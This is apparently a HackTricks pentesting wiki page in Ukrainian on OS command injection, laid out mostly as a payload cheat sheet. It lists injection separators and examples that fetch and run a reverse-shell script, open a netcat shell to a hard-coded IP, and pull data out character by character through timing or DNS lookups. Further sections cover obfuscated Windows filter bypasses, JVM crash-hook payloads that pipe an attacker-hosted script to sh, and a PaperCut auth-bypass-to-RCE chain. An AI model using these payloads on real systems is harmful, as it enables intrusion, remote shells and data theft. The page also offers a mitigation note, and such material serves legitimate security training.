# Command Injection

{{#include ../banners/hacktricks-training.md}}

## Що таке command Injection?

A **command injection** дозволяє атакуючому виконувати довільні команди операційної системи на сервері, на якому розміщено застосунок. Внаслідок цього застосунок та всі його дані можуть бути повністю скомпрометовані. Виконання таких команд зазвичай дає атакуючому можливість отримати несанкціонований доступ або контроль над середовищем застосунку та підлеглою системою.

### Контекст

Залежно від того, **куди вводяться ваші дані**, можливо, потрібно **завершити цитований контекст** (використовуючи `"` або `'`) перед командами.

## Command Injection/Execution
```bash
#Both Unix and Windows supported
ls||id; ls ||id; ls|| id; ls || id # Execute both
ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
ls&&id; ls &&id; ls&& id; ls && id #  Execute 2º if 1º finish ok
ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2º
ls %0A id # %0A Execute both (RECOMMENDED)
ls%0abash%09-c%09"id"%0a   # (Combining new lines and tabs)

#Only unix supported
`ls` # ``
$(ls) # $()
ls; id # ; Chain commands
ls${LS_COLORS:10:1}${IFS}id # Might be useful

#Not executed but may be interesting
> /var/www/html/out.txt #Try to redirect the output to a file
< /etc/passwd #Try to send some input to the command
```
### **Limition** Обхідні шляхи

Якщо ви намагаєтеся виконати **довільні команди всередині linux-машини**, вам буде цікаво прочитати про ці **обхідні шляхи:**


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### **Приклади**
```
vuln=127.0.0.1 %0a wget https://web.es/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php
vuln=127.0.0.1%0anohup nc -e /bin/bash 51.15.192.49 80
vuln=echo PAYLOAD > /tmp/pay.txt; cat /tmp/pay.txt | base64 -d > /tmp/pay; chmod 744 /tmp/pay; /tmp/pay
```
### Параметри

Ось топ-25 параметрів, які можуть бути вразливими до code injection та подібних RCE vulnerabilities (з [link](https://twitter.com/trbughunters/status/1283133356922884096)):
```
?cmd={payload}
?exec={payload}
?command={payload}
?execute{payload}
?ping={payload}
?query={payload}
?jump={payload}
?code={payload}
?reg={payload}
?do={payload}
?func={payload}
?arg={payload}
?option={payload}
?load={payload}
?process={payload}
?step={payload}
?read={payload}
?function={payload}
?req={payload}
?feature={payload}
?exe={payload}
?module={payload}
?payload={payload}
?run={payload}
?print={payload}
```
### Time based data exfiltration

Витяг даних: символ за символом
```
swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
real    0m5.007s
user    0m0.000s
sys 0m0.000s

swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
real    0m0.002s
user    0m0.000s
sys 0m0.000s
```
### DNS based data exfiltration

На основі інструмента з `https://github.com/HoLyVieR/dnsbin`, також розміщеного на dnsbin.zhack.ca
```
1. Go to http://dnsbin.zhack.ca/
2. Execute a simple 'ls'
for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
```

```
$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)
```
Онлайн-інструменти для перевірки на DNS based data exfiltration:

- dnsbin.zhack.ca
- pingb.in

### Filtering bypass

#### Windows
```
powershell C:**2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:**32\c*?c.e?e # calc
```
#### Linux


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### Node.js `child_process.exec` vs `execFile`

Під час аудиту JavaScript/TypeScript серверної частини ви часто зіштовхнетеся з Node.js `child_process` API.
```javascript
// Vulnerable: user-controlled variables interpolated inside a template string
const { exec } = require('child_process');
exec(`/usr/bin/do-something --id_user ${id_user} --payload '${JSON.stringify(payload)}'`, (err, stdout) => {
/* … */
});
```
`exec()` запускає **shell** (`/bin/sh -c`), тому будь-який символ, який має спеціальне значення для shell (back-ticks, `;`, `&&`, `|`, `$()`, …) призведе до **command injection**, коли вхідні дані користувача конкатенуються в рядку.

**Mitigation:** використовуйте `execFile()` (або `spawn()` без опції `shell`) і передавайте **кожен аргумент як окремий елемент масиву**, щоб shell не був задіяний:
```javascript
const { execFile } = require('child_process');
execFile('/usr/bin/do-something', [
'--id_user', id_user,
'--payload', JSON.stringify(payload)
]);
```
Real-world case: *Synology Photos* ≤ 1.7.0-0794 was exploitable through an unauthenticated WebSocket event that placed attacker controlled data into `id_user` which was later embedded in an `exec()` call, achieving RCE (Pwn2Own Ireland 2024).

### Argument/Option injection via leading hyphen (argv, no shell metacharacters)

Не всі ін'єкції вимагають shell-метасимволів. Якщо додаток передає неперевірені рядки як аргументи в системну утиліту (навіть при використанні `execve`/`execFile` і без shell), багато програм все одно розбиратимуть будь-який аргумент, що починається з `-` або `--`, як опцію. Це дозволяє атакуючому переключати режими, змінювати шляхи виводу або викликати небезпечну поведінку, не потрапляючи в shell.

Типові місця, де це зустрічається:

- Вбудовані web UI/CGI-обробники, які будують команди типу `ping <user>`, `tcpdump -i <iface> -w <file>`, `curl <url>` тощо.
- Централізовані CGI routers (наприклад, `/cgi-bin/<something>.cgi` з параметром-селектором типу `topicurl=<handler>`), де кілька обробників повторно використовують той самий слабкий валідатор.

Що спробувати:

- Надайте значення, що починаються з `-`/`--`, щоб їх сприйняв інструмент, який виконує команду.
- Зловживайте прапорами, що змінюють поведінку або записують файли, наприклад:
- `ping`: `-f`/`-c 100000` щоб навантажити пристрій (DoS)
- `curl`: `-o /tmp/x` щоб записати довільні шляхи, `-K <url>` щоб завантажити конфіг, керований атакуючим
- `tcpdump`: `-G 1 -W 1 -z /path/script.sh` щоб досягти виконання після ротації у небезпечних оболонках
- Якщо програма підтримує `--` end-of-options, спробуйте обійти наївні захисти, які передряджують `--` у неправильному місці.

Generic PoC shapes against centralized CGI dispatchers:
```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Content-Type: application/x-www-form-urlencoded

# Flip options in a downstream tool via argv injection
topicurl=<handler>&param=-n

# Unauthenticated RCE when a handler concatenates into a shell
topicurl=setEasyMeshAgentCfg&agentName=;id;
```
### Діагностичні callback'и JVM для гарантованого виконання команд

Будь-який примітив, який дозволяє вам **inject JVM command-line arguments** (`_JAVA_OPTIONS`, launcher config files, `AdditionalJavaArguments` fields in desktop agents, etc.) можна перетворити на надійний RCE без зміни байткоду додатку:

1. **Примусити детермінований збій** шляхом зменшення metaspace або heap: `-XX:MaxMetaspaceSize=16m` (або маленький `-Xmx`). Це гарантує `OutOfMemoryError` навіть під час раннього bootstrap.
2. **Прикріпити error hook**: `-XX:OnOutOfMemoryError="<cmd>"` або `-XX:OnError="<cmd>"` виконує довільну OS команду щоразу, коли JVM аварійно завершується.
3. За бажання додайте `-XX:+CrashOnOutOfMemoryError`, щоб уникнути спроб відновлення і зробити payload одноразовим.

Приклади payloads:
```
-XX:MaxMetaspaceSize=16m -XX:OnOutOfMemoryError="cmd.exe /c powershell -nop -w hidden -EncodedCommand <blob>"
-XX:MaxMetaspaceSize=12m -XX:OnOutOfMemoryError="/bin/sh -c 'curl -fsS https://attacker/p.sh | sh'"
```
Оскільки ці діагностики парсуються самим JVM, shell-метасимволи не потрібні, і команда виконується з тим самим рівнем привілеїв, що й launcher. Тому Desktop IPC вразливості, які переадресовують прапори JVM, надані користувачем (див. [Localhost WebSocket abuse](websocket-attacks.md#localhost-websocket-abuse--browser-port-discovery)), безпосередньо призводять до виконання команд ОС.

## PaperCut NG/MF SetupCompleted auth bypass -> print scripting RCE

- Уразливі NG/MF збірки (наприклад, 22.0.5 Build 63914) відкривають `/app?service=page/SetupCompleted`; при переході туди та натисканні **Login** повертається валідний `JSESSIONID` без облікових даних (authentication bypass in the setup flow).
- У **Options → Config Editor** встановіть `print-and-device.script.enabled=Y` та `print.script.sandboxed=N`, щоб увімкнути printer scripting і відключити sandbox.
- У вкладці принтера **Scripting** увімкніть скрипт і залиште визначеним `printJobHook`, щоб уникнути помилок валідації, але розмістіть payload **outside** функції, щоб він виконався негайно після натискання **Apply** (no print job needed):
```js
function printJobHook(inputs, actions) {}
cmd = ["bash","-c","curl http://attacker/hit"];
java.lang.Runtime.getRuntime().exec(cmd);
```
- Замініть callback на reverse shell; якщо UI/PoC не може обробляти pipes/redirects, stage payload з одною командою і exec її другим запитом.
- Horizon3's [CVE-2023-27350.py](https://github.com/horizon3ai/CVE-2023-27350/blob/main/CVE-2023-27350.py) автоматизує auth bypass, config flips, command execution, та rollback — проганяйте його через upstream proxy (наприклад, `proxychains` → Squid), коли сервіс доступний тільки зсередини.

## Brute-Force Detection List


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/command_injection.txt
{{#endref}}


## Посилання

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [https://portswigger.net/web-security/os-command-injection](https://portswigger.net/web-security/os-command-injection)
- [Extraction of Synology encrypted archives – Synacktiv 2025](https://www.synacktiv.com/publications/extraction-des-archives-chiffrees-synology-pwn2own-irlande-2024.html)
- [PHP proc_open manual](https://www.php.net/manual/en/function.proc-open.php)
- [HTB Nocturnal: IDOR → Command Injection → Root via ISPConfig (CVE‑2023‑46818)](https://0xdf.gitlab.io/2025/08/16/htb-nocturnal.html)
- [Unit 42 – TOTOLINK X6000R: Three New Vulnerabilities Uncovered](https://unit42.paloaltonetworks.com/totolink-x6000r-vulnerabilities/)
- [When WebSockets Lead to RCE in CurseForge](https://elliott.diy/blog/curseforge/)
- [PaperCut NG/MF SetupCompleted auth bypass → print scripting RCE](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [CVE-2023-27350.py (auth bypass + print scripting automation)](https://github.com/horizon3ai/CVE-2023-27350/blob/main/CVE-2023-27350.py)

{{#include ../banners/hacktricks-training.md}}
